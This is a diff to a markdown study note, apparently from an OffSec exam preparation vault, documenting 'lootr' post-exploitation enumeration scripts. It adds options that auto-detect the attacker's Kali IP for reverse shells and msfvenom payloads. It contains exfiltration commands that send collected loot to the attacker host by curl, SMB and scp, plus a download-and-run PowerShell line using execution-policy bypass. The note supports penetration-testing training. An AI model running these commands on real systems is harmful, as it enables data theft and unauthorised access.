@@ -34,6 +34,10 @@ tags:
 ./lootr.sh --phase network
 ./lootr.sh --phase files
 ./lootr.sh --phase procs
+
+# Kali IP for reverse shell snippets in attack_commands.txt
+# Auto-detected from $SSH_CLIENT (set by sshd) — only needed if delivered via reverse shell
+./lootr.sh --kali-ip 10.10.14.5
 ```
 
 ### Windows — `lootr.ps1`
@@ -54,6 +58,10 @@ tags:
 .\lootr.ps1 -Phase creds
 .\lootr.ps1 -Phase network
 .\lootr.ps1 -Phase files
+
+# Kali IP for LHOST in msfvenom commands in attack_commands.txt
+# Auto-detected from active RDP/WinRM/SSH session — only needed if delivered via bind shell
+.\lootr.ps1 -KaliIp 10.10.14.5
 ```
 
 > [!tip] Transfer + Execution
@@ -131,7 +139,7 @@ The scripts handle all collection logic. This section tells you **what to look f
 | `files` | `files/suid_binaries.txt`, `files/capabilities.txt`, `files/cron_jobs.txt`, `files/recently_modified.txt` | GTFOBins candidates, cap_setuid, writable cron scripts, fresh changes |
 | `procs` | `procs/root_processes.txt`, `procs/services.txt` | Root-owned services to abuse, pspy candidates |
 
-> For exploitation steps on SUID, capabilities, cron, and other Linux privesc vectors → start with `attack_commands.txt`.
+> For exploitation steps on SUID, capabilities, cron, and other Linux privesc vectors → [[Linux_PrivEsc]]
 
 ### Windows — `lootr.ps1`
 
@@ -143,7 +151,7 @@ The scripts handle all collection logic. This section tells you **what to look f
 | `network` | `network\internal_listeners.txt`, `network\shares.txt`, `network\mapped_drives.txt`, `network\hosts.txt` | 127.0.0.1 services to tunnel, SMB shares to loot, lateral targets |
 | `files` | `files\always_install_elevated.txt`, `files\unquoted_service_paths.txt`, `files\writable_service_binaries.txt`, `files\writable_path_dirs.txt`, `files\dll_hijack_candidates.txt` | Direct privesc vectors — each maps to a known technique |
 
-> For exploitation steps on AlwaysInstallElevated, service abuse, potato attacks, and other Windows privesc vectors → start with `attack_commands.txt`.
+> For exploitation steps on AlwaysInstallElevated, service abuse, potato attacks, and other Windows privesc vectors → [[Windows_PrivEsc]]
 
 ## Review Order After Execution
 
@@ -257,28 +265,32 @@ Get-Content "$ROOT\network\hosts.txt"
 
 ### Linux exfil
 
+`KALI_IP` in the exfil commands below is auto-detected from `$SSH_CLIENT` (the IP your SSH session came from). If lootr.sh was delivered via reverse shell instead, pass `--kali-ip` explicitly.
+
 ```bash
 # Compress loot before transfer so you preserve structure and reduce copy pain
 HOST=$(hostname)
 tar czf /tmp/${HOST}_loot.tgz loot/$HOST
 
 # HTTP pull from Kali if you can serve or fetch cleanly
-curl http://KALI_IP:PORT/${HOST}_loot.tgz -o ${HOST}_loot.tgz
+curl http://<auto-kali-ip>:PORT/${HOST}_loot.tgz -o ${HOST}_loot.tgz
 
 # SMB copy if your share is already up
-cp -r loot/$HOST //KALI_IP/share/
+cp -r loot/$HOST //<auto-kali-ip>/share/
 
 # SCP if SSH works and creds are stable
-scp -r loot/$HOST kali@KALI_IP:~/loot_${HOST}/
+scp -r loot/$HOST kali@<auto-kali-ip>:~/loot_${HOST}/
 ```
 
 ### Windows staging
 
+`LHOST` in all msfvenom commands in `attack_commands.txt` is auto-detected from the active RDP/WinRM/SSH connection. Pass `-KaliIp` if delivered via bind shell.
+
 ```powershell
 # Example transfer from Kali-served HTTP to target, then execute from temp
 cd C:\Windows\Temp
-iwr -Uri http://KALI_IP/lootr.ps1 -OutFile lootr.ps1
-powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot
+iwr -Uri http://<kali-ip>/lootr.ps1 -OutFile lootr.ps1
+powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot -KaliIp <kali-ip>
 ```
 
 ## Gotchas / OffSec Notes
@@ -301,8 +313,8 @@ powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot
 
 - [[OffSec_Exam_Methodology_Complete]]
 - [[Reverse_Shells]]
-- `attack_commands.txt` in the lootr output directory
-- [[escalatr]]
+- [[Linux_PrivEsc]]
+- [[Windows_PrivEsc]]
 - [[pivotr]]
 - [[sprayr]]
 - [[crackr]]
